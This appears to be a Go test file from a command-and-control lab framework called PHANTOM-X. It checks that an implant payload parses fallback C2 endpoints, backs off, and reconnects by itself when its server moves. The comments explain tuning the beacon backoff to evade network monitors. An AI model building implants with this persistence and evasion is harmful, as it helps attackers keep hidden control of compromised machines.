// =============================================================================
// PHANTOM-X :: Phase 5 -- the resilient endpoint tests
// =============================================================================
// endpoints_test.go -- Checks the behaviour that makes the lab work on a
// network that is not the one it was built on.
//
// WHAT IS TESTED
//
//     1. The endpoint list is built from the environment and from the
//        primary, in the right order.
//     2. A host that resolves to several addresses gives several
//        candidates, in the order the resolver returned them.
//     3. The backoff grows and then settles.
//     4. The payload RECONNECTS when the session ends, and it resolves
//        the name again -- which is what lets it pick up a C2 that has
//        moved address.
//
// WHY (4) MATTERS MORE THAN THE OTHERS
//
//     The most common way a lab session ends is not an attack and not a
//     bug. The operator's laptop changed network: the WiFi dropped, the
//     hotspot took over, and the socket died. A payload that exits
//     there worked perfectly and then stopped working because the
//     operator walked out of the room.
//
//     The test simulates that: it kills the C2, starts a NEW one on a
//     different port, and checks that the payload comes back on its own.
//
// RUN
//     go test -v -run TestResilient .
// =============================================================================

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"
)

// TestBackoffGrows checks that the retry interval grows and then settles.
//
// A payload that reconnects every two seconds tells a network monitor
// exactly what it is. A payload that waits 60 seconds between attempts
// after the first few is indistinguishable from a laptop that is simply
// not connected.
func TestBackoffGrows(t *testing.T) {
	want := []uint{0, 5, 10, 20, 40, 60, 60, 60, 60}
	for i, w := range want {
		got := pxBackoffFor(uint(i))
		if got != w {
			t.Errorf("backoff at attempt %d: got %d, want %d", i, got, w)
		}
	}
	// Past the end of the table it holds at the last value, so a long
	// outage does not eventually stop trying.
	if pxBackoffFor(1000) != 60 {
		t.Errorf("backoff past the table: got %d, want 60", pxBackoffFor(1000))
	}
}

// TestEndpointListParsing checks the endpoint list format.
func TestEndpointListParsing(t *testing.T) {
	eps := ParseEndpointList("c2.lab.example:9001,10.0.0.5:443,c2-backup.lab.example")
	if len(eps) != 3 {
		t.Fatalf("parsed %d endpoints, want 3", len(eps))
	}
	if eps[0].Host != "c2.lab.example" || eps[0].Port != 9001 {
		t.Errorf("first endpoint: got %s:%d", eps[0].Host, eps[0].Port)
	}
	if eps[1].Host != "10.0.0.5" || eps[1].Port != 443 {
		t.Errorf("second endpoint: got %s:%d", eps[1].Host, eps[1].Port)
	}
	if eps[2].Host != "c2-backup.lab.example" || eps[2].Port != 0 {
		t.Errorf("third endpoint: got %s:%d", eps[2].Host, eps[2].Port)
	}
	// The order is the order they were given: the primary first.
	if eps[0].Host != "c2.lab.example" {
		t.Error("the primary endpoint is not first")
	}
}

// TestResilientPayloadReconnects is the important one.
//
// It runs the resilient payload against a C2, kills the C2, starts a
// different one, and checks that the payload reconnects on its own.
func TestResilientPayloadReconnects(t *testing.T) {
	payload := findVariant(t)
	if payload == "" {
		t.Skip("no variant payload")
	}
	// Only the resilient arm reconnects.
	if !strings.Contains(strings.ToLower(payload), "resilient") {
		t.Skipf("this is not the resilient arm: %s", payload)
	}

	port1 := 9421
	port2 := 9422

	// The first C2.
	srv1 := newServer("127.0.0.1", port1, os.TempDir()+"/px_resil_1.jsonl",
		false, 0)
	ln1, err := listenLocal(port1)
	if err != nil {
		t.Fatalf("cannot bind %d: %v", port1, err)
	}
	go srv1.acceptLoop(ln1)
	defer srv1.shutdown()

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port1),
		"PX_C2_ENDPOINTS="+fmt.Sprintf("127.0.0.1:%d,127.0.0.1:%d", port1, port2),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	// The payload must reach the first C2.
	sess := waitForSession(srv1, 20*time.Second)
	if sess == nil {
		t.Fatal("the payload never reached the first C2")
	}
	t.Logf("connected to the first C2 on %d", port1)

	// Kill the first C2 THE WAY A NETWORK FAILURE KILLS IT.
	//
	// The listener is closed and the connections are dropped, but no EXIT
	// is sent. That is the difference between "the network changed" and
	// "the operator asked the payload to stop" -- and the payload has to
	// treat them differently. An EXIT means stop; a dropped socket means
	// reconnect.
	//
	// Calling shutdown() here would send the EXIT, and the payload would
	// correctly exit rather than reconnect, so the test would prove
	// nothing.
	srv1.sessionsMu.Lock()
	for _, s := range srv1.sessions {
		s.conn.Close()
	}
	srv1.sessionsMu.Unlock()
	ln1.Close()
	srv1.running = false
	time.Sleep(500 * time.Millisecond)

	// Bring up a second C2 on the other port. The payload's endpoint
	// list contains both, so it should find this one.
	srv2 := newServer("127.0.0.1", port2, os.TempDir()+"/px_resil_2.jsonl",
		false, 0)
	ln2, err := listenLocal(port2)
	if err != nil {
		t.Fatalf("cannot bind %d: %v", port2, err)
	}
	go srv2.acceptLoop(ln2)
	defer srv2.shutdown()

	// The payload should reconnect on its own. The backoff means this
	// takes a few seconds.
	deadline := time.Now().Add(60 * time.Second)
	var reconnected *Session
	for time.Now().Before(deadline) {
		srv2.sessionsMu.Lock()
		for _, s := range srv2.sessions {
			reconnected = s
			break
		}
		srv2.sessionsMu.Unlock()
		if reconnected != nil {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if reconnected == nil {
		t.Fatal("the payload did not reconnect after the first C2 died")
	}
	t.Logf("the payload reconnected to the second C2 on %d", port2)
}

// TestEndpointListOrdering checks that the primary endpoint comes first
// and the fallbacks follow in the order they were given.
//
// The order matters: the primary is the one the operator chose, and it
// should be the one used when it works. The fallbacks are for when it
// does not.
//
// Literal addresses are used here because a NAME would need a DNS server,
// and the point of this check is the ORDER, not the resolution.
func TestEndpointListOrdering(t *testing.T) {
	eps := ParseEndpointList("192.0.2.10:9001,192.0.2.20:443,192.0.2.30")

	resolved := ResolveEndpoints(eps, 9001)
	if len(resolved) != 3 {
		t.Fatalf("resolved %d endpoints, want 3: %v", len(resolved), resolved)
	}
	if resolved[0] != "192.0.2.10:9001" {
		t.Errorf("the primary is not first: %v", resolved)
	}
	if resolved[1] != "192.0.2.20:443" {
		t.Errorf("the first fallback is out of order: %v", resolved)
	}
	// An endpoint with no port takes the default.
	if resolved[2] != "192.0.2.30:9001" {
		t.Errorf("the default port was not applied: %v", resolved)
	}
}
